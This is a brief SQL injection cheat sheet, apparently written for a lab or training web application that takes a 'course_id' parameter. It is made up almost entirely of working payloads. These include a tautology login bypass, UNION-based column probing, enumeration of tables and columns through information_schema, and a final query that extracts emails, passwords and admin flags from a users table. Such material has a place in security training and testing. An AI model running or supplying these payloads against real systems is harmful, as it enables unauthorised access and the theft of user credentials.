# Cheat sheet


Login bypass
```
course_id=3' OR '1'='1
```

Well, is there anything more on the system?
```
course_id=3' UNION ALL SELECT 1 FROM information_schema.tables WHERE '1'='1
course_id=3' UNION ALL SELECT 1,2 FROM information_schema.tables WHERE '1'='1
course_id=3' UNION ALL SELECT 1,2,3 FROM information_schema.tables WHERE '1'='1
```

```
course_id=3' UNION ALL SELECT table_schema, table_name, 1 FROM information_schema.tables WHERE '1'='1
```

Filter out data
```
course_id=3' UNION ALL SELECT table_schema, table_name, 1 FROM information_schema.tables WHERE table_schema=database() AND '1'='1
```

Get columns
```
course_id=3' UNION ALL SELECT column_name, 1, 2 FROM information_schema.columns WHERE table_name="users" AND table_schema=database() AND '1'='1

```

Get the actual data

```
course_id=3' UNION ALL SELECT email, password, is_admin FROM users WHERE '1'='1
```